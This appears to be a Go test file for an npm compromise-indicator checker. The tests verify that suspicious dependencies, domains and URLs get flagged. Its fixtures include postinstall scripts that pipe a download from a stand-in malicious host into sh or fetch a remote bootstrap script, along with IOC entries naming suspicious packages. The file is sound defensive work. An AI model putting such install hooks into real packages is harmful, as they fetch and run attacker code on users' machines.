package analyzer_test

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/AgentSafe-AI/tooltrust-scanner/pkg/analyzer"
	"github.com/AgentSafe-AI/tooltrust-scanner/pkg/model"
)

func TestNPMIOCChecker_SuspiciousDependency_Finding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.1": {
			Name:         "axios",
			Version:      "1.14.1",
			Dependencies: map[string]string{"plain-crypto-js": "^0.4.2"},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "AS-016", issues[0].RuleID)
	assert.Equal(t, "NPM_IOC_DEPENDENCY", issues[0].Code)
	assert.Equal(t, model.SeverityCritical, issues[0].Severity)
	assert.Contains(t, issues[0].Description, "plain-crypto-js")
}

func TestNPMIOCChecker_NoIOC_NoFinding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.0": {
			Name:         "axios",
			Version:      "1.14.0",
			Dependencies: map[string]string{"follow-redirects": "^1.15.0"},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.0", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	assert.Empty(t, issues)
}

func TestNPMIOCChecker_SuspiciousScriptPattern_Finding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.1": {
			Name:    "axios",
			Version: "1.14.1",
			Scripts: map[string]string{
				"postinstall": "curl -fsSL https://evil.example/payload.sh | sh",
			},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "AS-016", issues[0].RuleID)
	assert.Equal(t, "NPM_IOC_INDICATOR", issues[0].Code)
	assert.Equal(t, model.SeverityCritical, issues[0].Severity)
	assert.Contains(t, issues[0].Description, "script_pattern")
	assert.Contains(t, issues[0].Description, "curl -fssl")
}

func TestNPMIOCChecker_TanStackSetupOptionalDependency_Finding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"@tanstack/react-router@1.169.8": {
			Name:                 "@tanstack/react-router",
			Version:              "1.169.8",
			OptionalDependencies: map[string]string{"@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "router_mcp",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "@tanstack/react-router", "version": "1.169.8", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "AS-016", issues[0].RuleID)
	assert.Equal(t, "NPM_IOC_DEPENDENCY", issues[0].Code)
	assert.Equal(t, model.SeverityCritical, issues[0].Severity)
	assert.Contains(t, issues[0].Description, "@tanstack/setup")
}

func TestNPMIOCChecker_SuspiciousDomainIOC_Finding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.1": {
			Name:    "axios",
			Version: "1.14.1",
			Scripts: map[string]string{
				"postinstall": "curl -fsSL https://cdn.evil.example/payload.sh | sh",
			},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	original := `[{"ecosystem":"npm","ioc_type":"domain","value":"evil.example","match":"contains","reason":"Known malicious delivery domain","confidence":"high"}]`
	index, err := analyzer.BuildNPMIOCIndexForRuntimeTest([]byte(original))
	require.NoError(t, err)
	checker = analyzer.NewNPMIOCCheckerWithIndexForTest(checker, index)

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "NPM_IOC_INDICATOR", issues[0].Code)
	assert.Contains(t, issues[0].Description, "evil.example")
}

func TestNPMIOCChecker_SuspiciousURLIOC_Finding(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
		"axios@1.14.1": {
			Name:    "axios",
			Version: "1.14.1",
			Scripts: map[string]string{
				"postinstall": "node -e \"fetch('https://evil.example/bootstrap.js')\"",
			},
		},
	}, nil)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	original := `[{"ecosystem":"npm","ioc_type":"url","value":"https://evil.example/bootstrap.js","match":"exact","reason":"Known malicious bootstrap URL","confidence":"high"}]`
	index, err := analyzer.BuildNPMIOCIndexForRuntimeTest([]byte(original))
	require.NoError(t, err)
	checker = analyzer.NewNPMIOCCheckerWithIndexForTest(checker, index)

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	require.Len(t, issues, 1)
	assert.Equal(t, "NPM_IOC_INDICATOR", issues[0].Code)
	assert.Contains(t, issues[0].Description, "https://evil.example/bootstrap.js")
}

func TestNPMIOCChecker_QueryError_Skips(t *testing.T) {
	checker := analyzer.NewNPMIOCCheckerWithMock(nil, assert.AnError)

	tool := model.UnifiedTool{
		Name: "deploy_site",
		Metadata: map[string]any{
			"dependencies": []any{
				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
			},
		},
	}

	issues, err := checker.Check(tool)
	require.NoError(t, err)
	assert.Empty(t, issues)
}

func TestBuildNPMIOCIndex_EmbeddedData_LoadsKnownIOC(t *testing.T) {
	idx, err := analyzer.BuildNPMIOCIndexForTest([]byte(`[
		{
			"ecosystem": "npm",
			"ioc_type": "package_name",
			"name": "plain-crypto-js",
			"reason": "Known IOC linked to an npm compromise",
			"confidence": "high"
		}
	]`))
	require.NoError(t, err)
	entry, ok := idx["plain-crypto-js"]
	require.True(t, ok)
	assert.Equal(t, "high", entry.Confidence)
}
